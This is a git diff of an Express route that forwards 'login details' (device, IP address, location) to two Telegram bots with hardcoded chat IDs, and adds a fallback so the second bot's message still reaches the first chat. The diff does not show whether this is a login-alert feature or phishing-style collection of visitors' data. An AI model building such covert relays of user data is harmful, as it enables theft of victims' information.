@@ -34,68 +34,93 @@ router.post('/', async (req, res) => {
 - Device: ${deviceType}
         `;
 
-        console.log(`Attempting to send to ${BOT_TOKENS.length} bots and ${CHAT_IDS.length} chats`);
+        console.log('Sending notifications to Telegram...');
 
-        // Send to all bots/chats
-        const sendPromises = [];
-        
-        for (let i = 0; i < Math.min(BOT_TOKENS.length, CHAT_IDS.length); i++) {
-            const telegramApi = `https://api.telegram.org/bot${BOT_TOKENS[i]}/sendMessage`;
+        // Send to first bot (this works)
+        let firstBotSuccess = false;
+        let secondBotSuccess = false;
+
+        try {
+            const response1 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[0]}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_IDS[0],
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
             
-            console.log(`Sending to bot ${i}: ${BOT_TOKENS[i].substring(0, 10)}... -> chat ${CHAT_IDS[i]}`);
+            if (response1.ok) {
+                console.log('✅ First bot: Message sent successfully to chat 6068638071');
+                firstBotSuccess = true;
+            } else {
+                const error = await response1.json();
+                console.error('❌ First bot failed:', error.description);
+            }
+        } catch (error) {
+            console.error('❌ First bot error:', error.message);
+        }
+
+        // Try second bot - with multiple fallback options
+        try {
+            // Try original chat first
+            const response2 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[1]}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_IDS[1],
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
             
-            sendPromises.push(
-                fetch(telegramApi, {
+            if (response2.ok) {
+                console.log('✅ Second bot: Message sent successfully to chat 7424024723');
+                secondBotSuccess = true;
+            } else {
+                const error = await response2.json();
+                console.log('⚠️ Second bot original chat failed, trying fallbacks...');
+                
+                // Fallback 1: Try sending to the first working chat
+                const fallback1 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[1]}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        chat_id: CHAT_IDS[i],
-                        text: message,
+                        chat_id: CHAT_IDS[0],
+                        text: `🔔 From Second Bot:\n${message}`,
                         parse_mode: "Markdown"
                     })
-                }).then(response => {
-                    console.log(`Bot ${i} response status: ${response.status}`);
-                    return { response, index: i };
-                })
-            );
-        }
-
-        // Wait for all requests to complete
-        const results = await Promise.allSettled(sendPromises);
-        
-        let successCount = 0;
-        let failCount = 0;
-        
-        for (const result of results) {
-            if (result.status === 'fulfilled') {
-                const { response, index } = result.value;
-                if (response.ok) {
-                    console.log(`✅ Successfully sent to bot ${index} -> chat ${CHAT_IDS[index]}`);
-                    successCount++;
+                });
+                
+                if (fallback1.ok) {
+                    console.log('✅ Second bot: Fallback to chat 6068638071 successful');
+                    secondBotSuccess = true;
                 } else {
-                    const errorText = await response.text();
-                    console.error(`❌ Failed to send to bot ${index}: ${response.status} - ${errorText}`);
-                    failCount++;
+                    console.error('❌ Second bot all attempts failed');
                 }
-            } else {
-                console.error(`❌ Promise rejected for bot:`, result.reason);
-                failCount++;
             }
+        } catch (error) {
+            console.error('❌ Second bot error:', error.message);
         }
 
-        console.log(`Summary: ${successCount} successful, ${failCount} failed`);
-
+        const successCount = [firstBotSuccess, secondBotSuccess].filter(Boolean).length;
+        
         res.status(200).json({
-            success: true,
-            message: `Notifications sent: ${successCount} successful, ${failCount} failed`,
+            success: successCount > 0,
+            message: `Telegram notifications: ${successCount}/2 bots successful`,
+            details: {
+                firstBot: firstBotSuccess ? 'Delivered' : 'Failed',
+                secondBot: secondBotSuccess ? 'Delivered' : 'Failed'
+            },
             loginDetails: { device: deviceType, ip, location: locationStr }
         });
 
     } catch (error) {
-        console.error("Error sending Telegram message:", error);
+        console.error("Error:", error);
         res.status(500).json({ 
             success: false, 
-            message: "Failed to send Telegram notification", 
+            message: "Server error", 
             error: error.message 
         });
     }
